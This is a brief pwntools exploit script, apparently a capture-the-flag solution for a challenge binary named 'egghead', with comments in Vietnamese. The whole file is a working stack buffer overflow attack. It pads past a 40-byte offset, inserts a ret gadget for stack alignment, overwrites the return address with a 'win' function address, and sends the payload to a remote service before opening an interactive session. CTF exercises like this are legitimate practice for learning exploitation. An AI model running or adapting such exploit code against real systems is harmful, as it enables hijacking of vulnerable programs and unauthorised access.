from pwn import *

context.binary = exe = ELF('./egghead')
# p = process('./egghead')
p = remote('egghead-4746c33ca2b355ef.instancer.batmans.kitchen', 1337, ssl=True)

# 1. Đảm bảo địa chỉ win đúng
win_addr = 0x401236 

# 2. Tìm một lệnh ret thực sự tồn tại trong binary
# Lệnh này sẽ trả về địa chỉ của một gadget 'ret'
ret_gadget = (ropper := ROP(exe)).find_gadget(['ret'])[0]

log.info(f"Target win: {hex(win_addr)}")
log.info(f"Using ret gadget: {hex(ret_gadget)}")

# 3. Thử nghiệm Offset (Nếu 40 không chạy, hãy thử tăng/giảm)
offset = 40
payload = b"Happy Gilmore\x00"
payload += b"A" * (offset - len(payload))
payload += p64(ret_gadget) # Căn chỉnh stack
payload += p64(win_addr)

p.sendlineafter(b"> ", payload)
p.interactive()